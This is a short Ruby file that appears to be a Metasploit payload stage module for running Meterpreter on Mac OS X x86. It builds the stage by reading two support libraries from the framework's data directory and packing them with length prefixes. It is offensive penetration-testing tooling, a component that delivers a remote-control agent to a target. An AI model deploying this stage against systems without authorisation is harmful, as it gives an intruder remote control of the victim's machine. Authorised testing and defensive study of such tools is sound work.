##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/osx'
require 'msf/base/sessions/meterpreter_x86_osx'
require 'msf/base/sessions/meterpreter_options'

module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Mac OS X x86 Meterpreter',
      'Description'   => 'Run meterpreter server on Mac OS X',
      'Author'        => 'anwarelmakrahy',
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x86_Osx
    ))
  end

  def generate_stage
    file = ::File.join(Msf::Config.data_directory, "meterpreter", "libsupport.dylib")
    libsupport = ::File.open(file, "rb") {|f| f.read(f.stat.size) }
    print_status("Preparing support library (#{libsupport.length} bytes)...")

    file = ::File.join(Msf::Config.data_directory, "meterpreter", "libmetsrv.dylib")
    libmetsrv = ::File.open(file, "rb") {|f| f.read(f.stat.size) }
    print_status("Preparing metsrv library (#{libmetsrv.length} bytes)...")

    [libsupport.length].pack('V') + libsupport + [libmetsrv.length ].pack('V') + libmetsrv
  end
end

